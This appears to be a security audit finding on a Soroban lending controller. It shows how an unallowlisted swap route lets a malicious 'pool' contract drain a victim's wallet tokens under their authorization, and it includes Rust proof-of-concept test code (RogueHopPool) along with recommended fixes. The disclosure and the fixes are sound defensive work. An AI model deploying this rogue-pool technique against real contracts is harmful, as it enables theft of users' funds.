### Title
Unallowlisted route pool lets payload-named contract execute arbitrary calls under the caller's authorization tree — wallet-token theft via `swap_collateral`/`swap_debt`/`multiply`/`repay_debt_with_collateral` — ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The SSRF bug class — attacker-controlled destination invoked by a trusted component — maps onto the controller's router integration: the `swap` parameter is an attacker-supplied XDR route, and neither the controller nor the router validates the pool/token addresses it names. A malicious "pool" contract placed in the route executes on the call stack below the *user's* authorization, so any `token.transfer(victim, attacker, …)` it issues is recorded as a child of the victim's auth entry and executes if the victim signs the simulated tree — draining arbitrary wallet tokens, not just the routed amount.

### Finding Description
`swap_tokens` is the single funnel for every controller strategy that trades (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`). It authorizes only one exact input-token transfer to the router and then invokes `router.execute_strategy(controller, amount_in, swap)` with the user-supplied route [1](#0-0) . The post-checks bound only the *controller's* balances: `RouterOverspend`/`NoSwapOutput` verify the controller's own `token_in`/`token_out` deltas [2](#0-1) .

The router keeps no allowlist of pool or token addresses, so the route can place third-party code on the stack beneath the caller's authorization; a transfer that such code makes from the caller joins the caller's auth tree in simulation and executes if signed [3](#0-2) . The threat model states the consequence explicitly: "The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [4](#0-3) .

A test-harness fixture proves the mechanics end-to-end through `swap_collateral`: `RogueHopPool::swap` calls `token::Client::transfer(&victim, &attacker, &amount)` for a token the protocol never listed [5](#0-4) , and recording mode shows the stolen transfer attached as a child of Alice's `swap_collateral` authorization, leaving her wallet at zero while the swap still returns a fair output [6](#0-5) .

### Impact Explanation
Theft of user funds beyond the routed amount. Any token held in the victim's wallet — including assets unrelated to the protocol — can be transferred to the attacker inside an otherwise legitimate-looking strategy call. The victim's lending position is untouched and the account can even end healthy, so no protocol-side risk gate detects it. Severity: High (wallet draining conditioned on the victim signing a poisoned auth tree, which the default `simulateTransaction` → sign flow produces automatically).

### Likelihood Explanation
A single unprivileged attacker deploys a malicious contract implementing a pool-shaped `swap` function, crafts a route XDR naming it as a hop pool, and gets a victim to submit it (e.g., via a malicious quote/route served off-chain, or a crafted route handed to the victim's client). No privileged role, timing, or price manipulation is needed. Mitigating factor: enforcing mode only accepts the theft if the victim signs the authorization tree containing the extra child; a client that decodes and whitelists the auth tree blocks it — the protocol currently relies on that client-side behavior [7](#0-6) .

### Recommendation
Constrain what on-chain code can run beneath the caller's authorization:
- Have the controller (or router) reject routes whose pool addresses are not in a governance-maintained venue allowlist, so payload-named contracts cannot execute inside strategy calls.
- Alternatively, isolate the swap in a sub-invocation that cannot inherit the caller's auth context (e.g., a separate user-signed `execute_strategy` call limited to one input transfer), rather than nesting arbitrary venue calls under `swap_collateral`'s auth entry.
- Ship/enforce a reference client validation that rejects any authorization tree with children other than the single expected input `transfer`.

### Proof of Concept
Executed in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:
1. Alice supplies 10 000 USDC; she also holds 77 770 000 000 units of an unlisted `wallet_token` [8](#0-7) .
2. Attacker deploys `RogueHopPool` whose `swap` performs `token::Client::new(&wallet_token).transfer(&alice, &attacker, &WALLET_BALANCE)` [5](#0-4) .
3. Alice calls `swap_collateral(account_id, USDC, 50_000_000_000, ETH, route)` where `route` names `RogueHopPool` as the hop pool [9](#0-8) .
4. The recorded auth tree contains the wallet-draining `transfer` as a child of Alice's `swap_collateral` entry; after signing, `balance(alice) == 0`, `balance(attacker) == WALLET_BALANCE`, while the swap still pays out `FAIR_OUT_ETH` [10](#0-9) .

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-55)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L83-108)
```rust
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
        let attacker = Address::generate(&t.env);
        Self {
            t,
            alice,
            attacker,
            wallet_token,
            account_id,
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-164)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
        match result {
            Ok(Ok(())) => Ok(()),
            Ok(Err(e)) => panic!("conversion error: {e:?}"),
            Err(Ok(e)) => Err(e),
            Err(Err(e)) => panic!("invoke error: {e:?}"),
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-226)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```
